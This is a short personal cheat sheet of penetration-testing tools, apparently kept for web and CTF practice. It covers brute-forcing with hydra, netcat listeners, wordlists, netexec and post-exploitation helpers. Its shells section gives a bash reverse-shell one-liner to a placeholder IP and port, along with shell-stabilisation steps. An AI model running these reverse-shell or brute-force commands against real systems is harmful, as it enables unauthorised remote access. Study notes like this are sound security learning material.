---
layout: single
classes: #wide
title: "Tools"
collection: infopages
permalink: /tools/
toc: true
toc_sticky: true
author_profile: true
---

# Welcome
Hi, this page is because I can't for the life of me remember my options when I am trying to web-test.  

## General tips
flask -> usually jinja2  
```2> /dev/null``` - hides error ouput  

## Brute-Force
ffuf  
cme - SMB brute force tool  
hydra:  
ex: ```hydra -l usr -P pass.txt ssh://www.example.com```

## Listeners
wireshark - self explanitory  
nc - net cat is a good listner
* Example usage: nc -lvnp 

## Wordlists
/usr/share/wordlists/  
* /seclists

## Network 
```python http.server``` - v3 python  
* Spawns python server

netexec:  
* Network service exploitation tool
* Helps automate assessing large networks

## Shells
reverse shell tips:  
```rlwrap nc -lnvpn``` (reverse shell with better fuctionality/arrowkeys)  

after get shell:  
```python3 -c 'import pty;pty.spawn("/bin/bash")'```
```ctrl - z```(to background the nc process)  
```stty raw -echo;fg```
```export TERM=xterm```   
* makes able to clear term
* better machine access

bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1


## Other
Pspy - inspect application


## Refrance links 
tbd

## Post exploitation
look for weird configs  
linpeas.sh big